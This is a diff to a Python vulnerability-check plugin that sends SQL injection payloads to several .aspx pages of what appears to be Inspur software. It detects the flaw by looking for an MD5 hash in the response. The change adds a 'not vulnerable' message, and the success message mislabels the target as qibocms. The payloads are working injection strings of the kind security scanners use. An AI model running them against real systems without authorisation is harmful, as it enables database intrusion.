@@ -37,15 +37,19 @@ class inspur_multi_sqli_BaseVerify:
                     "/ViewSource/SrcPrintList.aspx?SerailNO='/**/and/**/1=sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271234%27))/**/--",
                     "/Business/OfflineDownload.aspx?formId=BBQB'/**/and/**/1=sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271234%27))/**/--&filetype=html&infoflowId=00263",
                     "/ViewSource/ProExamineView.aspx?ActivityInstanceId=&ActivitySchemeGuid=9a0b1f9e-d564-4ec9-945f-600b5a4dd2ed'/**/and/**/1=sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271234%27))/**/--"]
+        noexist = True
         try:
             for payload in payloads:
                 vulnurl = self.url + payload
                 req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
                 if r"81dc9bdb52d04dc20036dbd8313ed055" in req.text:
                     cprint("[+]存在qibocms知道系统注入漏洞...(高危)\tpayload: "+vulnurl, "red")
+                    noexist = False
+            if noexist:
+                cprint("[-]不存在inspur_multi_sqli漏洞", "white", "on_grey")
 
         except:
-            cprint("[-] "+__file__+"====>连接超时", "cyan")
+            cprint("[-] "+__file__+"====>可能不存在漏洞", "cyan")
 
 if __name__ == "__main__":
     warnings.filterwarnings("ignore")
